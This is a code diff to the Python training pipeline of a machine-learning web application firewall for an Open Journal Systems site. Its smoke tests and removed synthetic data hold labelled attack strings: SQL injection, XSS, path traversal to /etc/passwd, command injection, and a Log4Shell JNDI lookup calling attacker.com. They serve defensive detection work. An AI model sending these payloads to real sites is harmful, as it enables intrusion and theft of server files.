@@ -1,23 +1,38 @@
 """
-WAF ML Training Pipeline
+WAF ML training pipeline.
 
-Reads real traffic data from dataset/raw/ and dataset/labeled/,
-trains a Random Forest classifier, evaluates with confusion matrix /
-per-attack-type report, tunes BLOCK_THRESHOLD, and saves the model.
+The pipeline materializes a realistic OJS dataset in memory via
+`ml_training.dataset_generator`, never reads CSV files, and produces a
+Random Forest bundle the runtime sidecar can load with feature-name
+verification.
 
-Usage:
-    python -m ml_training.train_pipeline            # auto dataset
-    python -m ml_training.train_pipeline --synthetic  # force synthetic fallback
-    python -m ml_training.train_pipeline --threshold-sweep  # show threshold table
+CLI
+---
+    python -m ml_training.train_pipeline                       # default config
+    python -m ml_training.train_pipeline --write-dataset       # also dump CSVs
+    python -m ml_training.train_pipeline --threshold-sweep     # PR/F1 table
+    python -m ml_training.train_pipeline --n-benign 6000 \\
+        --n-attack-per-type 800 --seed 7
+
+Model bundle layout
+-------------------
+    {
+        "model": sklearn.ensemble.RandomForestClassifier,
+        "feature_names": [...],          # parity check at runtime
+        "block_threshold": float,         # recommended threshold
+        "attack_types": [...],
+        "model_version": "rf-realistic-v1",
+        "trained_at": "<ISO 8601 UTC>"
+    }
 """
 
+from __future__ import annotations
+
 import argparse
-import os
 import pickle
-import sys
 from dataclasses import dataclass
+from datetime import datetime, timezone
 from pathlib import Path
-from typing import Optional
 
 import numpy as np
 import pandas as pd
@@ -32,133 +47,85 @@ from sklearn.metrics import (
 )
 from sklearn.model_selection import train_test_split
 
-from ml_training.features import NUM_FEATURES, extract_features
+from ml_training.dataset_generator import (
+    ATTACK_TYPES,
+    generate_dataset,
+    write_schema_v3_csvs,
+)
+from ml_training.features import FEATURE_NAMES, NUM_FEATURES, extract_features
 
 PROJECT_DIR = Path(__file__).resolve().parent.parent
-DATASET_DIR = PROJECT_DIR / "dataset"
 MODEL_PATH = PROJECT_DIR / "ml_training" / "waf_model.pkl"
+DATASET_OUTPUT_DIR = PROJECT_DIR / "dataset" / "synthetic"
 
-ATTACK_TYPES = ["SQL_INJECTION", "XSS", "PATH_TRAVERSAL", "COMMAND_INJECTION", "UNKNOWN_ATTACK"]
+MODEL_VERSION = "rf-realistic-v1"
 
 
 @dataclass(frozen=True)
 class TrainingConfig:
-    n_estimators: int = 100
-    max_depth: int = 10
+    n_benign: int = 6000
+    n_attack_per_type: int = 600
+    n_estimators: int = 200
+    max_depth: int = 14
     seed: int = 42
     test_size: float = 0.2
-    default_threshold: float = 0.70
+    default_threshold: float = 0.50  # threshold sweep refines
 
 
 # ---------------------------------------------------------------------------
-# Dataset loaders
+# Feature matrix
 # ---------------------------------------------------------------------------
 
-def load_labeled_csvs(labeled_dir: Path) -> Optional[pd.DataFrame]:
-    """Load all labeled CSVs; return None if directory is empty."""
-    files = sorted(labeled_dir.glob("*.csv"))
-    if not files:
-        return None
-    frames = []
-    for f in files:
-        try:
-            df = pd.read_csv(f, skipinitialspace=True)
-            frames.append(df)
-        except Exception as exc:
-            print(f"[!] Skipping {f.name}: {exc}")
-    if not frames:
-        return None
-    return pd.concat(frames, ignore_index=True)
+def build_feature_matrix(df: pd.DataFrame) -> tuple[np.ndarray, np.ndarray, np.ndarray]:
+    """
+    Build (X, y, attack_labels) for stratification.
 
+    The `req_rate` feature is computed inline over a 60s rolling window per
+    source IP, ordered by timestamp — matching the runtime behavior of
+    `core/sidecar_agent.SidecarWAF.predict`.
+    """
+    df = df.copy()
+    df["timestamp_dt"] = pd.to_datetime(
+        df["timestamp"], format="mixed", errors="coerce", utc=True
+    )
+    df = df.sort_values("timestamp_dt").reset_index(drop=True)
 
-def _derive_label(row) -> int:
-    """Derive binary label from decision column (BLOCK=1, PASS=0)."""
-    decision = str(row.get("decision", "")).upper()
-    return 1 if decision == "BLOCK" else 0
+    ip_history: dict[str, list[float]] = {}
+    rows: list[list[float]] = []
+    y: list[int] = []
+    attack_labels: list[str] = []
 
-
-def build_feature_matrix(df: pd.DataFrame) -> tuple[np.ndarray, np.ndarray]:
-    """Build (X, y) from a labeled DataFrame."""
-    rows = []
-    labels = []
     for _, row in df.iterrows():
+        ip = str(row.get("source_ip", ""))
+        ts = row.get("timestamp_dt")
+        rate = 0.0
+        if pd.notna(ts):
+            ts_val = ts.timestamp()
+            recent = [t for t in ip_history.get(ip, []) if ts_val - t < 60]
+            recent.append(ts_val)
+            ip_history[ip] = recent
+            rate = float(len(recent))
+
         feats = extract_features(
             method=str(row.get("method", "GET")),
             uri=str(row.get("uri", "")),
             query_string=str(row.get("query_string", "")),
-            body=str(row.get("body_raw", row.get("body_truncated", ""))),
+            body=str(row.get("body_truncated", "")),
             headers=str(row.get("headers_raw", "")),
-            stateful_req_rate=0.0,
+            stateful_req_rate=rate,
         )
         rows.append(feats)
-        labels.append(_derive_label(row))
-    return np.array(rows), np.array(labels)
+        y.append(1 if str(row.get("decision", "PASS")).upper() == "BLOCK" else 0)
+        attack_labels.append(str(row.get("attack_type", "NONE")))
 
-
-# ---------------------------------------------------------------------------
-# Synthetic fallback (mirrors train_waf_model.py generate_synthetic_dataset)
-# ---------------------------------------------------------------------------
-
-def generate_synthetic_dataset() -> pd.DataFrame:
-    print("[*] No real labeled data found — generating synthetic dataset...")
-    rng = np.random.default_rng(42)
-    data = []
-
-    normal_uris = [
-        "/index.php/testjournal/index",
-        "/index.php/testjournal/article/view/123",
-        "/index.php/testjournal/search?query=science",
-        "/lib/pkp/styles/pkp.css",
-        "/index.php/testjournal/user/register",
-        "/index.php/testjournal/about",
-    ]
-    for _ in range(2500):
-        uri = rng.choice(normal_uris)
-        query_string = uri.partition("?")[2] if "?" in uri else ""
-        data.append({
-            "method": "GET", "uri": uri, "query_string": query_string,
-            "body_raw": "", "headers_raw": "Host: local-ojs.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html",
-            "decision": "PASS", "attack_type": "NONE",
-        })
-
-    attacks = [
-        ("/index.php/testjournal/search?query=science' OR '1'='1", "GET",
-         "Host: local-ojs.com\r\nUser-Agent: Nikto/2.1.6", "SQL_INJECTION"),
-        ("/index.php/testjournal/article/view/123", "POST",
-         "User-Agent: curl/7.68.0", "SQL_INJECTION"),
-        ("/index.php/testjournal/search?query=admin'; DROP TABLE users--", "GET",
-         "Host: local-ojs.com", "SQL_INJECTION"),
-        ("/index.php/testjournal/search?query=<script>alert('xss')</script>", "GET",
-         "Host: local-ojs.com\r\nUser-Agent: Mozilla/5.0", "XSS"),
-        ("/index.php/testjournal/user/register?username=\"><svg/onload=alert(1)>", "GET",
-         "Host: local-ojs.com", "XSS"),
-        ("/index.php/testjournal/article/download/123/../../../../../etc/passwd", "GET",
-         "Host: local-ojs.com", "PATH_TRAVERSAL"),
-        ("/index.php/testjournal/search?query=../../../windows/win.ini", "TRACE",
-         "Host: local-ojs.com\r\nUser-Agent: test", "PATH_TRAVERSAL"),
-        ("/index.php/testjournal/search?query=science; ping -c 4 127.0.0.1", "GET",
-         "Host: local-ojs.com\r\nUser-Agent: bot", "COMMAND_INJECTION"),
-        ("/index.php/testjournal/search?query=`whoami`", "POST",
-         "Host: local-ojs.com\r\nUser-Agent: curl", "COMMAND_INJECTION"),
-    ]
-    for _ in range(1500):
-        idx = int(rng.integers(0, len(attacks)))
-        uri, method, headers, atype = attacks[idx]
-        query_string = uri.partition("?")[2] if "?" in uri else ""
-        data.append({
-            "method": method, "uri": uri, "query_string": query_string,
-            "body_raw": "", "headers_raw": headers,
-            "decision": "BLOCK", "attack_type": atype,
-        })
-
-    return pd.DataFrame(data)
+    return np.array(rows, dtype=float), np.array(y, dtype=int), np.array(attack_labels)
 
 
 # ---------------------------------------------------------------------------
 # Evaluation helpers
 # ---------------------------------------------------------------------------
 
-def print_confusion_matrix(y_true, y_pred) -> None:
+def print_confusion_matrix(y_true: np.ndarray, y_pred: np.ndarray) -> None:
     cm = confusion_matrix(y_true, y_pred)
     tn, fp, fn, tp = cm.ravel()
     print("\n  Confusion Matrix:")
@@ -167,40 +134,48 @@ def print_confusion_matrix(y_true, y_pred) -> None:
     print(f"  Actual BLOCK      {fn:6d}          {tp:6d}")
 
 
-def print_per_attack_report(df_test: pd.DataFrame, y_pred: np.ndarray) -> None:
-    if "attack_type" not in df_test.columns:
-        return
-    print("\n  Per-Attack-Type Report:")
-    df_eval = df_test.copy().reset_index(drop=True)
-    df_eval["y_pred"] = y_pred
-    df_eval["y_true"] = (df_eval["decision"].str.upper() == "BLOCK").astype(int)
-
+def print_per_attack_recall(
+    attack_labels_test: np.ndarray, y_true: np.ndarray, y_pred: np.ndarray
+) -> None:
+    print("\n  Per-Attack-Type Recall:")
     for atype in ATTACK_TYPES:
-        mask = df_eval["attack_type"] == atype
+        mask = (attack_labels_test == atype)
         if mask.sum() == 0:
             continue
-        subset = df_eval[mask]
-        tp = int(((subset["y_true"] == 1) & (subset["y_pred"] == 1)).sum())
-        fn = int(((subset["y_true"] == 1) & (subset["y_pred"] == 0)).sum())
         total = int(mask.sum())
-        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
-        print(f"    {atype:<22} total={total:4d}  detected={tp:4d}  missed={fn:4d}  recall={recall:.2%}")
+        true_positive = int(((y_true[mask] == 1) & (y_pred[mask] == 1)).sum())
+        missed = int(((y_true[mask] == 1) & (y_pred[mask] == 0)).sum())
+        recall = (
+            true_positive / (true_positive + missed)
+            if (true_positive + missed) else 0.0
+        )
+        print(
+            f"    {atype:<22} total={total:4d}  detected={true_positive:4d}  "
+            f"missed={missed:4d}  recall={recall:.2%}"
+        )
+
+    benign_mask = (attack_labels_test == "NONE")
+    if benign_mask.sum():
+        false_positive = int(
+            ((y_true[benign_mask] == 0) & (y_pred[benign_mask] == 1)).sum()
+        )
+        fpr = false_positive / int(benign_mask.sum())
+        print(
+            f"    {'BENIGN':<22} total={int(benign_mask.sum()):4d}  "
+            f"false_positives={false_positive:4d}  fpr={fpr:.2%}"
+        )
 
 
-def threshold_sweep(y_true, y_proba, thresholds=None) -> float:
-    """Print precision/recall/F1 for a range of thresholds; return best F1 threshold."""
-    if thresholds is None:
-        thresholds = np.arange(0.30, 0.96, 0.05)
-
+def threshold_sweep(y_true: np.ndarray, y_proba: np.ndarray) -> float:
     print("\n  Threshold Sweep (attack class):")
     print(f"  {'Threshold':>10}  {'Precision':>10}  {'Recall':>8}  {'F1':>8}")
-    best_f1, best_thresh = 0.0, 0.70
-    for t in thresholds:
+    best_f1, best_thresh = 0.0, 0.50
+    for t in np.arange(0.30, 0.96, 0.05):
         y_pred_t = (y_proba >= t).astype(int)
         p = precision_score(y_true, y_pred_t, zero_division=0)
         r = recall_score(y_true, y_pred_t, zero_division=0)
         f = f1_score(y_true, y_pred_t, zero_division=0)
-        marker = " ◄" if f > best_f1 else ""
+        marker = " <-- best so far" if f > best_f1 else ""
         print(f"  {t:>10.2f}  {p:>10.4f}  {r:>8.4f}  {f:>8.4f}{marker}")
         if f > best_f1:
             best_f1, best_thresh = f, float(t)
@@ -209,112 +184,314 @@ def threshold_sweep(y_true, y_proba, thresholds=None) -> float:
 
 
 # ---------------------------------------------------------------------------
+# Held-out real-style sanity probes
+# ---------------------------------------------------------------------------
+
+_SMOKE_TESTS = [
+    (
+        "benign_search",
+        "GET",
+        "/index.php/testjournal/search/search?query=machine+learning",
+        "query=machine+learning",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+    (
+        "benign_article_view",
+        "GET",
+        "/index.php/testjournal/article/view/42",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+    (
+        "sqli_url_encoded",
+        "GET",
+        "/index.php/testjournal/search/search?query=%27%20OR%20%271%27%3D%271",
+        "query=%27%20OR%20%271%27%3D%271",
+        "",
+        "Host: ojs.local\r\nUser-Agent: sqlmap/1.7",
+        1,
+    ),
+    (
+        "sqli_comment_split",
+        "GET",
+        "/index.php/testjournal/search/search?query=UN/**/ION/**/SE/**/LECT+1,2,3",
+        "query=UN/**/ION/**/SE/**/LECT+1,2,3",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        1,
+    ),
+    (
+        "sqli_time_based",
+        "GET",
+        "/index.php/testjournal/article/view/1'+AND+SLEEP(5)--",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        1,
+    ),
+    (
+        "xss_svg",
+        "GET",
+        "/index.php/testjournal/search/search?query=%3Csvg/onload=alert(1)%3E",
+        "query=%3Csvg/onload=alert(1)%3E",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        1,
+    ),
+    (
+        "xss_event_handler",
+        "POST",
+        "/index.php/testjournal/comments/save",
+        "",
+        "comment=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&article=42",
+        "Host: ojs.local\r\nUser-Agent: curl/7.81.0",
+        1,
+    ),
+    (
+        "path_traversal_encoded",
+        "GET",
+        "/index.php/testjournal/article/download/1/..%2f..%2f..%2fetc%2fpasswd",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Wget/1.21.3",
+        1,
+    ),
+    (
+        "cmd_injection_ifs",
+        "GET",
+        "/index.php/testjournal/search/search?query=health;cat${IFS}/etc/passwd",
+        "query=health;cat${IFS}/etc/passwd",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        1,
+    ),
+    (
+        "log4shell_jndi",
+        "GET",
+        "/index.php/testjournal/search/search?q=${jndi:ldap://attacker.com/a}",
+        "q=${jndi:ldap://attacker.com/a}",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        1,
+    ),
+    # Admin / editor / reviewer workflows — must NOT be blocked
+    (
+        "admin_dashboard",
+        "GET",
+        "/index.php/testjournal/dashboard",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        0,
+    ),
+    (
+        "admin_submission_wizard",
+        "GET",
+        "/index.php/testjournal/submission/wizard/1?step=1&submissionId=42",
+        "step=1&submissionId=42",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+    (
+        "admin_ajax_file_api",
+        "GET",
+        "/index.php/testjournal/$$$call$$$/ui/file-api/get-files?stageId=2&submissionId=10",
+        "stageId=2&submissionId=10",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+    (
+        "admin_manager_setup",
+        "GET",
+        "/index.php/testjournal/manager/setup/index",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+    (
+        "editor_submissions",
+        "GET",
+        "/index.php/testjournal/editor/submissions",
+        "",
+        "",
+        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
+        0,
+    ),
+]
+
+
+def run_smoke_tests(model: RandomForestClassifier, threshold: float) -> None:
+    print("\n  Held-out real-style smoke tests:")
+    correct = 0
+    for name, method, uri, qs, body, headers, expected in _SMOKE_TESTS:
+        feats = extract_features(
+            method=method, uri=uri, query_string=qs, body=body,
+            headers=headers, stateful_req_rate=1.0,
+        )
+        proba = float(model.predict_proba(np.array([feats]))[0, 1])
+        pred = 1 if proba >= threshold else 0
+        ok = (pred == expected)
+        correct += int(ok)
+        status = "PASS" if ok else "FAIL"
+        verdict = "BLOCK" if pred == 1 else "PASS"
+        expect_str = "BLOCK" if expected == 1 else "PASS"
+        print(
+            f"    [{status}] {name:<24} pred={verdict:<5} (score={proba:.3f})  "
+            f"expected={expect_str}"
+        )
+    print(f"\n  Smoke-test accuracy: {correct}/{len(_SMOKE_TESTS)}")
+
+
+# ---------------------------------------------------------------------------
 # Main pipeline
 # ---------------------------------------------------------------------------
 
-def run_pipeline(config: TrainingConfig, force_synthetic: bool = False, show_threshold_sweep: bool = False) -> None:
-    print("=" * 56)
-    print("  WAF ML Training Pipeline")
-    print("=" * 56)
+def run_pipeline(
+    config: TrainingConfig,
+    write_dataset: bool = False,
+    show_threshold_sweep: bool = False,
+) -> None:
+    print("=" * 64)
+    print(f"  WAF ML Training Pipeline ({MODEL_VERSION})")
+    print("=" * 64)
 
-    # 1. Load data
-    df = None
-    if not force_synthetic:
-        df = load_labeled_csvs(DATASET_DIR / "labeled")
-
-    if df is None or len(df) < 100:
-        print(f"[!] Real labeled data insufficient ({len(df) if df is not None else 0} rows). Using synthetic.")
-        df = generate_synthetic_dataset()
-    else:
-        print(f"[*] Loaded {len(df)} real labeled records from dataset/labeled/")
-
-    print(f"[*] Label distribution: PASS={int((df['decision'].str.upper()=='PASS').sum())}  "
-          f"BLOCK={int((df['decision'].str.upper()=='BLOCK').sum())}")
-
-    # 2. Extract features
-    print("[*] Extracting features...")
-    X, y = build_feature_matrix(df)
-    print(f"[*] Feature matrix: {X.shape}  (expected cols={NUM_FEATURES})")
-    assert X.shape[1] == NUM_FEATURES, f"Feature dim mismatch: {X.shape[1]} != {NUM_FEATURES}"
-
-    # 3. Split
-    X_train, X_test, y_train, y_test = train_test_split(
-        X, y, test_size=config.test_size, random_state=config.seed, stratify=y
+    print(
+        f"[*] Synthesizing dataset: n_benign={config.n_benign}  "
+        f"n_attack_per_type={config.n_attack_per_type}  seed={config.seed}"
     )
-    df_test = df.iloc[len(X_train):].reset_index(drop=True)  # approximate — used only for per-attack report
+    df = generate_dataset(
+        n_benign=config.n_benign,
+        n_attack_per_type=config.n_attack_per_type,
+        seed=config.seed,
+    )
+    counts = df["attack_type"].value_counts().to_dict()
+    print(f"    Class distribution: {counts}")
 
-    # 4. Train
-    print(f"[*] Training Random Forest (n_estimators={config.n_estimators}, max_depth={config.max_depth})...")
+    if write_dataset:
+        raw_path, labeled_path = write_schema_v3_csvs(df, DATASET_OUTPUT_DIR)
+        print(f"    Raw CSV     -> {raw_path}")
+        print(f"    Labeled CSV -> {labeled_path}")
+
+    print("[*] Extracting features...")
+    X, y, attack_labels = build_feature_matrix(df)
+    print(f"    Feature matrix shape: {X.shape}  (expected cols={NUM_FEATURES})")
+    assert X.shape[1] == NUM_FEATURES, (
+        f"Feature dim mismatch: {X.shape[1]} != {NUM_FEATURES}"
+    )
+
+    stratify = np.where(y == 1, attack_labels, "BENIGN")
+    X_train, X_test, y_train, y_test, atk_train, atk_test = train_test_split(
+        X, y, attack_labels,
+        test_size=config.test_size,
+        random_state=config.seed,
+        stratify=stratify,
+    )
+
+    print(
+        f"[*] Training Random Forest "
+        f"(n_estimators={config.n_estimators}, max_depth={config.max_depth}, "
+        f"class_weight=balanced)..."
+    )
     clf = RandomForestClassifier(
         n_estimators=config.n_estimators,
         max_depth=config.max_depth,
+        class_weight="balanced",
         random_state=config.seed,
         n_jobs=-1,
     )
     clf.fit(X_train, y_train)
 
-    # 5. Evaluate
-    y_pred = clf.predict(X_test)
     y_proba = clf.predict_proba(X_test)[:, 1]
+    y_pred_default = (y_proba >= config.default_threshold).astype(int)
 
-    print("\n--- Model Evaluation ---")
-    print(f"  Accuracy : {(y_pred == y_test).mean() * 100:.2f}%")
-    print(f"  Precision: {precision_score(y_test, y_pred, zero_division=0):.4f}")
-    print(f"  Recall   : {recall_score(y_test, y_pred, zero_division=0):.4f}")
-    print(f"  F1       : {f1_score(y_test, y_pred, zero_division=0):.4f}")
+    print("\n--- Model Evaluation (default threshold) ---")
+    print(f"  Threshold: {config.default_threshold:.2f}")
+    print(f"  Accuracy : {(y_pred_default == y_test).mean() * 100:.2f}%")
+    print(f"  Precision: {precision_score(y_test, y_pred_default, zero_division=0):.4f}")
+    print(f"  Recall   : {recall_score(y_test, y_pred_default, zero_division=0):.4f}")
+    print(f"  F1       : {f1_score(y_test, y_pred_default, zero_division=0):.4f}")
     try:
         print(f"  AUC-ROC  : {roc_auc_score(y_test, y_proba):.4f}")
     except ValueError:
         pass
 
-    print_confusion_matrix(y_test, y_pred)
-
+    print_confusion_matrix(y_test, y_pred_default)
     print("\n  Classification Report:")
-    print(classification_report(y_test, y_pred, target_names=["PASS", "BLOCK"]))
+    print(classification_report(
+        y_test, y_pred_default, target_names=["PASS", "BLOCK"], zero_division=0
+    ))
+    print_per_attack_recall(atk_test, y_test, y_pred_default)
 
-    # 6. Per-attack-type report (best-effort; relies on attack_type column)
-    try:
-        # Re-split with same seed to align df_test with X_test
-        _, df_test_aligned = train_test_split(df, test_size=config.test_size, random_state=config.seed)
-        print_per_attack_report(df_test_aligned, y_pred)
-    except Exception:
-        pass
+    best_thresh = threshold_sweep(y_test, y_proba)
+    y_pred_best = (y_proba >= best_thresh).astype(int)
+    print(f"\n--- Evaluation at best threshold ({best_thresh:.2f}) ---")
+    print(f"  Precision: {precision_score(y_test, y_pred_best, zero_division=0):.4f}")
+    print(f"  Recall   : {recall_score(y_test, y_pred_best, zero_division=0):.4f}")
+    print(f"  F1       : {f1_score(y_test, y_pred_best, zero_division=0):.4f}")
+    print_per_attack_recall(atk_test, y_test, y_pred_best)
 
-    # 7. Threshold sweep
-    if show_threshold_sweep:
-        best_thresh = threshold_sweep(y_test, y_proba)
-        print(f"\n[i] To apply best threshold, set BLOCK_THRESHOLD = {best_thresh:.2f} in sidecar_agent.py")
-    else:
-        print(f"\n[i] Run with --threshold-sweep to tune BLOCK_THRESHOLD (current default: {config.default_threshold})")
+    run_smoke_tests(clf, best_thresh)
 
-    # 8. Save model
+    bundle = {
+        "model": clf,
+        "feature_names": list(FEATURE_NAMES),
+        "block_threshold": float(best_thresh),
+        "attack_types": list(ATTACK_TYPES),
+        "model_version": MODEL_VERSION,
+        "trained_at": datetime.now(timezone.utc).isoformat(),
+    }
     MODEL_PATH.parent.mkdir(parents=True, exist_ok=True)
-    with open(MODEL_PATH, "wb") as f:
-        pickle.dump(clf, f)
-    print(f"\n[*] Model saved → {MODEL_PATH}")
+    with MODEL_PATH.open("wb") as f:
+        pickle.dump(bundle, f)
+    print(f"\n[*] Model bundle saved -> {MODEL_PATH}")
+    print(
+        f"    Recommended BLOCK_THRESHOLD = {best_thresh:.2f}  "
+        f"(bundle also stores this for the sidecar to read at load time)."
+    )
 
 
 # ---------------------------------------------------------------------------
-# CLI entry point
+# CLI
 # ---------------------------------------------------------------------------
 
-def main():
+def main() -> None:
     parser = argparse.ArgumentParser(description="WAF ML Training Pipeline")
-    parser.add_argument("--synthetic", action="store_true",
-                        help="Force synthetic dataset even when real data exists")
-    parser.add_argument("--threshold-sweep", action="store_true",
-                        help="Print precision/recall/F1 table across thresholds")
-    parser.add_argument("--n-estimators", type=int, default=100)
-    parser.add_argument("--max-depth", type=int, default=10)
+    parser.add_argument("--n-benign", type=int, default=4500)
+    parser.add_argument("--n-attack-per-type", type=int, default=600)
+    parser.add_argument("--n-estimators", type=int, default=200)
+    parser.add_argument("--max-depth", type=int, default=14)
     parser.add_argument("--seed", type=int, default=42)
+    parser.add_argument(
+        "--write-dataset",
+        action="store_true",
+        help="Also write the generated dataset to dataset/synthetic/{raw,labeled}/",
+    )
+    parser.add_argument(
+        "--threshold-sweep",
+        action="store_true",
+        help="Show full precision/recall/F1 table across thresholds.",
+    )
     args = parser.parse_args()
 
     config = TrainingConfig(
+        n_benign=args.n_benign,
+        n_attack_per_type=args.n_attack_per_type,
         n_estimators=args.n_estimators,
         max_depth=args.max_depth,
         seed=args.seed,
     )
-    run_pipeline(config, force_synthetic=args.synthetic, show_threshold_sweep=args.threshold_sweep)
+    run_pipeline(
+        config,
+        write_dataset=args.write_dataset,
+        show_threshold_sweep=args.threshold_sweep,
+    )
 
 
 if __name__ == "__main__":
